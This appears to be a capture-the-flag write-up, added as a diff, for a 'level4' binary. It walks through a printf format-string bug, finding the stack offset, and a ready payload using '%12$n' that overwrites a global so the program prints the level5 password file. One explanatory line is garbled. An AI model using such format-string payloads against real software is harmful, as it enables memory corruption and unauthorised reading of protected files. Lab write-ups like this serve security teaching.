@@ -1,0 +1,20 @@
+Goal: use the format-string vulnerability to set the global flag and trigger the level5 password output.
+
+Observation:
+- `p()` calls `printf` with user-controlled input (format-string vulnerability).
+- `n()` checks a global at 0x8049810 against 0x01025544.
+- If the value matches, it runs `/bin/cat /home/user/level5/.pass`.
+
+Steps:
+1) Find the stack offset for our input:
+	AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+	0x41414141 appears at position 12 -> offset 12.
+2) Write the target value using a single `%n` with a large width:
+	The payload prints 0x01025544 characters, then `%12$n` writes that count into 0x8049810.
+    0x01025544 in decimal is 16930114 - 4 of thr addres and  'd' t just lets you print a huge number of characters to reach the exact value you want before %n writes it.
+3) Execute:
+	python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' | ./level4
+4) Output shows the level5 password.
+
+Result:
+- The command prints the level5 password, stored in the flag file.
